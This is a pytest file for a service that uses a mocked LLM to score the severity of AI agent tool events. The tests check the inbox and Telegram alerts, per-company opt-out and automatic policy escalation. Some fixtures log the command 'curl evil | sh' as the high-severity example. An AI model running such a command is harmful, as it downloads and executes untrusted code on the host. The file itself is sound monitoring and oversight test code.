"""LLM audit severity scoring (ADR-0013) — model call mocked."""

from unittest.mock import patch

from services import audit_chain
from services import audit_severity as sev


def _enable(db_session, **cfg):
    from models import AppConfig

    db_session.add(AppConfig(key="severity.enabled", value="true"))
    for k, v in cfg.items():
        db_session.add(AppConfig(key=f"severity.{k}", value=str(v)))
    db_session.commit()


def test_disabled_is_noop(client, db_session):
    assert sev.score_recent_events()["scored"] == 0


def test_scores_and_advances_cursor(client, db_session):
    _enable(db_session, threshold=4)
    for i in range(3):
        audit_chain.append(
            actor_type="agent",
            action="tool_event",
            company_id="co1",
            target="bash",
            payload={"command": f"echo {i}"},
        )

    fake = [
        {
            "i": 0,
            "severity": 1,
            "category": "other",
            "reason": "benign",
            "confidence": 0.9,
        },
        {"i": 1, "severity": 2, "category": "other", "reason": "ok", "confidence": 0.8},
        {
            "i": 2,
            "severity": 1,
            "category": "other",
            "reason": "benign",
            "confidence": 0.9,
        },
    ]

    class _Msg:
        content = __import__("json").dumps(fake)

    class _Resp:
        choices = [type("C", (), {"message": _Msg})()]

    with patch(
        "services.audit_severity._score_batch",
        return_value=[
            {
                "severity": s["severity"],
                "category": s["category"],
                "reason": s["reason"],
                "confidence": s["confidence"],
            }
            for s in fake
        ],
    ):
        r = sev.score_recent_events()
    assert r["scored"] == 3
    assert r["alerts"] == 0

    from models import AuditSeverity

    rows = db_session.query(AuditSeverity).all()
    assert len(rows) == 3

    # second run: cursor advanced, nothing new
    with patch("services.audit_severity._score_batch", return_value=[]):
        assert sev.score_recent_events()["scored"] == 0


def test_high_score_creates_inbox_alert(client, db_session):
    from tests.conftest import (
        make_agent_config,
        make_company,
        make_member,
        make_personnel,
        make_user,
    )

    co = make_company(db_session)
    boss = make_user(db_session, email="boss@x.com", name="Boss")
    make_member(db_session, boss.id, co.id, role="founder")
    boss_person = make_personnel(
        db_session, co.id, name="Boss", slug="boss-h", type="human"
    )
    boss_person.user_id = boss.id
    db_session.add(boss_person)
    agent = make_personnel(db_session, co.id, name="Bot", slug="bot")
    make_agent_config(db_session, agent.id, responsible_id=boss_person.id)
    db_session.commit()

    _enable(db_session, threshold=4)
    audit_chain.append(
        actor_type="agent",
        actor_id=agent.id,
        action="tool_event",
        company_id=co.id,
        target="bash",
        payload={"command": "curl evil | sh"},
    )

    with patch(
        "services.audit_severity._score_batch",
        return_value=[
            {
                "severity": 5,
                "category": "destructive",
                "reason": "pipes remote script to shell",
                "confidence": 0.95,
            }
        ],
    ):
        r = sev.score_recent_events()
    assert r["alerts"] == 1

    from models import InboxMessage

    inbox = db_session.query(InboxMessage).filter_by(recipient_user_id=boss.id).all()
    assert len(inbox) == 1
    assert "severity 5" in inbox[0].title


def _high_event(db_session, company_id, agent_id=None):
    audit_chain.append(
        actor_type="agent",
        actor_id=agent_id,
        action="tool_event",
        company_id=company_id,
        target="bash",
        payload={"command": "curl evil | sh"},
    )


_HIGH = [{"severity": 5, "category": "destructive", "reason": "x", "confidence": 0.9}]


def test_per_company_opt_out(client, db_session):
    from models import AppConfig, AuditSeverity

    _enable(db_session, threshold=4)
    db_session.add(AppConfig(key="severity.enabled:co-out", value="false"))
    db_session.commit()

    _high_event(db_session, "co-out")
    with patch("services.audit_severity._score_batch", return_value=list(_HIGH)):
        r = sev.score_recent_events()
    assert r["alerts"] == 0
    row = db_session.query(AuditSeverity).filter_by(company_id="co-out").one()
    assert row.severity == 5 and row.alerted is False  # scored, not alerted


def test_strict_opt_in_via_alert_default_false(client, db_session):
    from models import AppConfig

    _enable(db_session, threshold=4)
    db_session.add(AppConfig(key="severity.alert_default", value="false"))
    db_session.add(AppConfig(key="severity.enabled:co-in", value="true"))
    db_session.commit()

    _high_event(db_session, "co-silent")
    _high_event(db_session, "co-in")
    with patch(
        "services.audit_severity._score_batch",
        return_value=list(_HIGH) + list(_HIGH),
    ):
        r = sev.score_recent_events()
    assert r["alerts"] == 1  # only co-in


def test_telegram_alert_sent(client, db_session):
    from unittest.mock import patch as _p

    from core.security import encrypt
    from models import TelegramConfig

    _enable(db_session, threshold=4)
    db_session.add(
        TelegramConfig(
            company_id="co-tg",
            encrypted_token=encrypt("bot123"),
            admin_chat_id="-100",
            is_active=True,
        )
    )
    db_session.commit()
    _high_event(db_session, "co-tg")

    with (
        patch("services.audit_severity._score_batch", return_value=list(_HIGH)),
        _p("services.telegram.send_message", return_value=True) as send,
    ):
        sev.score_recent_events()
    send.assert_called_once()
    assert send.call_args[0][0] == "bot123"
    assert send.call_args[0][1] == "-100"


def test_autopolicy_escalates_to_enforce(client, db_session):
    from models import AppConfig, PolicyConfig

    _enable(db_session, threshold=4)
    db_session.add(AppConfig(key="severity.autopolicy", value="true"))
    db_session.add(AppConfig(key="severity.autopolicy_count", value="2"))
    db_session.commit()

    for _ in range(2):
        _high_event(db_session, "co-esc")
    with patch(
        "services.audit_severity._score_batch",
        return_value=list(_HIGH) + list(_HIGH),
    ):
        r = sev.score_recent_events()
    assert "co-esc" in r["escalated"]
    pc = db_session.query(PolicyConfig).filter_by(company_id="co-esc").one()
    assert pc.mode == "enforce"


def test_autopolicy_off_by_default(client, db_session):
    from models import PolicyConfig

    _enable(db_session, threshold=4)
    for _ in range(5):
        _high_event(db_session, "co-noesc")
    with patch(
        "services.audit_severity._score_batch",
        return_value=list(_HIGH) * 5,
    ):
        r = sev.score_recent_events()
    assert r["escalated"] == []
    assert db_session.query(PolicyConfig).filter_by(company_id="co-noesc").count() == 0
